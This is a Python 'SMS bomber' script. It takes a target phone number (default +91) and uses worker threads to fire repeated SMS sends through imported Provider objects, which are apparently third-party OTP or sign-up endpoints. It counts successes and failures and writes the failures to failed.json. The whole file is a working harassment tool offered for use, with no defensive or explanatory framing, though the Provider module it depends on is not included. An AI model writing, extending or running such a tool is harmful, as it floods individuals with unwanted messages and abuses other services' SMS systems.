#!/usr/bin/python3

import requests
import argparse
from queue import Queue
from threading import Thread
import json,time
from Provider import Provider

#args
parser = argparse.ArgumentParser()
parser.add_argument('target', metavar='TARGET', type=int, help='Target mobile number without country code (default: +91)')
parser.add_argument('--sms', '-S', type=int, help='Number of sms to target (default: 10)', default=10)
parser.add_argument('--threads', '-T', type=int, help='Number of threads (default: 10)', default=10)
args = parser.parse_args()

#config loading
q = Queue()
target = str(args.target)
no_of_threads = args.threads
no_of_sms = args.sms
fails = 0
success = 0
failed = []

#headers
headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0","Accept":"*/*","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}

#bomber function
def bomber():
    global fails,success,failed,q,headers,no_of_sms
    while True:
        p = q.get()
        if p is None: break
        elif success > no_of_sms: break
        elif not p.done:
            p.start()
            if p.status(): success+=1
            else:
                failed.append(p.log)
                fails+=1

        print('[+]\tprocessing : ({0},{1})/{2}'.format(str(success),str(fails),str(no_of_sms)),end='\r')
        q.task_done()

dash = '-'*25
print(f'{dash}')    
print('[i] target ['+target+']')
print('[i] threads ['+str(no_of_threads)+']')
print('[i] sms ['+str(no_of_sms)+']')
print(f'{dash}\n')    

#threadsssss
threads = []
for i in range(no_of_threads):
    t = Thread(target=bomber)
    t.start()
    threads.append(t)

#bombing target with random providers
for i in range(no_of_sms):
    q.put(Provider(target))

# block until all tasks are done
q.join()

# stop workers
for i in range(no_of_threads):
    q.put(None)
for t in threads:
    t.join()

#finalize
print(f'\n\n{dash}')   
print('[i] all completed')
print('[i] '+str(success)+' succeed')
print('[i] '+str(fails)+' failed')
print(f'{dash}')   

json.dump({'list':failed}, open('failed.json','w+'), indent=4)